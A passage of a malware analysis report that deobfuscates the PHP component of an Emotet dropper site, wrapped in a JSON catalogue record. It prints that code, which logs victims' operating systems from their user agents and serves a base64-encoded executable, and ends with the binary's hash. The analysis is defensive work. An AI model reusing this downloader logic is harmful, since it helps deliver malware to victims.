$operatingSystem.\n\nIf no match is found, the value minus one is returned. This can happen when the given\nargument is either null or consists only of newline characters. The refactored code is given\nbelow.\n```\n     private function getOperatingSystem($regexSubject)\n     {\n          foreach($this->regex_ as $operatingSystem => $forEachValue) {\n              foreach($forEachValue as $nestedArray) {\n                   $nestedArray = '/(?:^|[^A-Z_-])(?:' .\nstr_replace('/', '\\\\/', $nestedArray) . ')/i';\n                   if (preg_match($nestedArray, $regexSubject)) {\n                        return $operatingSystem;\n                   }\n              }\n          }\n          return -1;\n     }\n\n```\nThe execute function is given below in parts.\n```\npublic function execute() {\n     $sp1cb870 = '.' . sha1(basename(dirname(__FILE__)));\n\n```\n[The variable $sp1cb870 is equal to the SHA-1 hash of the](https://secure.php.net/manual/en/function.sha1.php) _[basename of the](https://secure.php.net/manual/en/function.basename.php)_ _[dirname of the](https://secure.php.net/manual/en/function.dirname.php)_\nmagic constant _[__FILE__. The basename returns the trailing name of the component. The](https://secure.php.net/manual/en/language.constants.predefined.php)_\n_dirname returns the parent directory of the provided argument (the magic constant_\n___FILE__, which equals the script itself). Note that the file name starts with a dot, making it a_\nhidden file on Unix-like systems.\n\nA proof-of-concept of this line is given below. The name of the folder in which the script\nresided, was emotet.\n```\n<?php echo sha1(basename(dirname(__FILE__))) . \"\\n\";\n\n```\nThe output of this script equals 8def78060ee806dcf94e65eb9b2fdf4ca1adb2de, which is the\nSHA-1 hash of emotet. The variable can be renamed to $sha1Hash.\n\nBelow, the next couple of lines are given.\n```\n          touch($sha1Hash);\n          $spdfc158 = fopen($sha1Hash 'r+');\n\n```\n\n-----\n\nThe _[touch function is used to set the time of a file. If the file does not exist, it is created.](https://secure.php.net/manual/en/function.touch.php)_\n\n[The newly created file is then opened using fopen. The parameter r+ opens the file as](https://secure.php.net/manual/en/function.fopen.php)\nreadable and writable with the file pointer set at the beginning of the file. As such, the\nvariable $spdfc158 can be renamed to $sha1HashFile.\n\nThe next two if-statements are given below.\n```\nif ($sha1HashFile !== false) {\n              if (flock($sha1HashFile, LOCK_EX)) {\n                   $sp7c7c2a = array();\n                   $spe8c644 = filesize($sha1Hash);\n                   if ($spe8c644 > 0) {\n                        $sp7c7c2a = json_decode(fread($sha1HashFile,\n$spe8c644), true);\n                   }\n[...]\n\n```\nThe if-statement compares if the $sha1HashFile is true (not identical to false). If this is the\n[case, the function flock is called with $sha1HashFile and LOCK_EX as arguments. This sets](https://secure.php.net/manual/en/function.flock.php)\nan exclusive lock on the file, meaning it cannot be modified by anything else until the file is\nunlocked.\n\n[The variable $spe8c644 is equal to the filesize of the $sha1Hash file. As such, it can be](https://secure.php.net/manual/en/function.filesize.php)\nrenamed to $sha1HashFileSize.\n\nThe _[json_decode function is used together with fread. The json_decode function is used to](https://secure.php.net/manual/en/function.json-decode.php)_\ndecode JSON. The second argument (true) is used to ensure that the return value is saved\nin the array type. The fread function requires the file and the length that should be read. It is\na binary-safe file read. The decoded result is saved in the previously instantiated array\n_$sp7c7c2a, which can be renamed into $decodedSha1File._\n\nThe next part of the function is given below.\n```\n$sp6345e2 = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';\n$spda961f = $this->getOperatingSystem($sp6345e2);\nif ($spda961f > 0) {\n     if (!isset($decodedSha1File[$spda961f]) ||\n!is_int($decodedSha1File[$spda961f])) {\n          $decodedSha1File[$spda961f] = 0;\n     }\n     $decodedSha1File[$spda961f]++;\n}\n\n```\nUsing the _[isset function, the HTTP_USER_AGENT is obtained. If it is not available, the](https://secure.php.net/manual/en/function.isset.php)_\nreturned value is an empty string. Hence, the variable $sp6345e2 can be renamed to\n_$userAgent._\n\n\n-----\n\nThe variable $spda961f contains the return value of the getOperatingSystem function. A\nsuitable name for this variable is $operatingSystem.\n\nIf the operating system (which is represented as a number based of the index in the $regex_\nvariable) within the JSON file does not exist or isn’t an integer, the value is set to zero. The\nvalue of the operating system within the JSON file is then incremented with one. An example\nof the content of the JSON is file is given below.\n```\n{\"5\":18}\n\n```\nThe key equals 5 whilst the value equals 18. The operating system type that corresponds\nwith the key is the fifth one in the $regex_: any character but a newline. The $sha1HashFile\nis used to keep track of the amount of downloads and the operating system which requested\nthe download.\n\nThe file lock is used to make sure that all requests are logged, as a race condition is\nmitigated due to the lock. The maximum execution time is set to an unlimited amount of time,\nmeaning sometimes the macro which requests the payload, has to wait a bit before the file is\nserved.\n\nAdditionally, it provides statistics for the criminal actor through which both the usage and the\noperating systems of the victims can be seen. Weird statistics might cause the actor to take\nthe site offline to mitigate the efforts of malware analysts.\n\nThe file handling part of the function is given below.\n```\n          fseek($sha1HashFile, 0);\n          fwrite($sha1HashFile, json_encode($decodedSha1File));\n          fflush($sha1HashFile);\n          flock($sha1HashFile, LOCK_UN);\n     }\n     fclose($sha1HashFile);\n}\n\n```\n[The file pointer is set to index 0 with fseek, after which](https://secure.php.net/manual/en/function.fseek.php) _[fwrite is called to write the string to](https://secure.php.net/manual/en/function.fwrite.php)_\n[the file. The function fflush flushes the output to a file. Lastly, the file is unlocked using flock](https://secure.php.net/manual/en/function.fflush.php)\n[(note the LOCK_UN argument to unlock the file). The file handle is then closed using fclose.](https://secure.php.net/manual/en/function.fclose.php)\n\nThe $sha1HashFile is used to keep track of statistics. Below, the code is rewritten in pseudo\ncode for a better understanding.\n```\nstatistics = openFile(sha1hash(currentDirectory()), EXCLUSIVE_LOCK);\noperatingSystem = getOperatingSystem(userAgent);\nif(!statistics.contains(operatingSystem)) {\n  statistics.add(operatingSystem, 0);\n}\nstatistics.increment(operatingSystem);\nstatistics.writeToFile();\ncloseFile(statistics, UNLOCK);\n\n```\n\n-----\n\nThe return value of the function is given below.\n```\nheader('Content-Type: ' . $this->contentType_);\nheader('Content-Disposition: attachment;\nfilename=\"' . $this->contentName_ . '\"');\nheader('Content-Transfer-Encoding: binary');\nreturn base64_decode($this->content_);\n\n```\nThe header is set to contain the content type, which is defined within the class, as well as the\ncontent disposition, which presumably is an attachment. The content encoding is binary. The\n[content header of the file is base64 decoded using base64_decode, which is the file that](https://secure.php.net/manual/en/function.base64-decode.php)\ngets executed by the malicious macro.\n\nDuring the analysis, the next stage (the file that is downloaded on the victim’s machine) is\none that is preferably saved separately. This can be done by replacing the return value in the\ncode by the two lines below.\n```\nfile_put_contents(\"/home/libra/Desktop/emotet/stage5.exe\", base64_decode($this>content_));\nreturn \"\";\n\n```\nFinally, the class can be renamed, as is shown below.\n```\n$downloadClass = new DownloadClass();\necho $downloadClass->execute();\n\n## Stage 5 – The binary\n\n```\nThe binary that is downloaded from the site is an executable which is detected as Emotet, as\n[can be seen here. The SHA-256 hash of the file is given below.](https://www.virustotal.com/#/file/82fa35d4f8552c453b7ae2603738478cc22a266e687e481d02473ace810c7e1a/detection)\n```\n82fa35d4f8552c453b7ae2603738478cc22a266e687e481d02473ace810c7e1a\n\n## Conclusion\n\n```\nThe obfuscation techniques within the macro were designed to avoid any form of string\ndetection mechanisms. Due to the possible random layout, it is harder to write rules for the\ndocuments.\n\nThe PHP files that are on the server, also serve a similar purpose. By obfuscating the PHP\ncode and executing the second PHP stage dynamically, it is harder for server owners to\ndetect a malicious file in a customer’s web hosting. This way, the malicious websites try to\nremain online for a longer period of time. Signature detection is also easily evaded since the\nfile can easily be obfuscated differently every so often.\n\nAll in all, it shows how much effort is put in to deliver an executable on the target, which then\nservers as yet another downloader for another stage within the infection process.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-02-16 - Emotet droppers.pdf"
    ],
    "report_names": [
        "2019-02-16 - Emotet droppers.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535881,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1653709820,
    "ts_modification_date": 1653709820,
    "files": {
        "pdf": "https://archive.orkl.eu/9f5c37624fdd10cb494657c0dd4c12f685ec23be.pdf",
        "text": "https://archive.orkl.eu/9f5c37624fdd10cb494657c0dd4c12f685ec23be.txt",
        "img": "https://archive.orkl.eu/9f5c37624fdd10cb494657c0dd4c12f685ec23be.jpg"
    }
}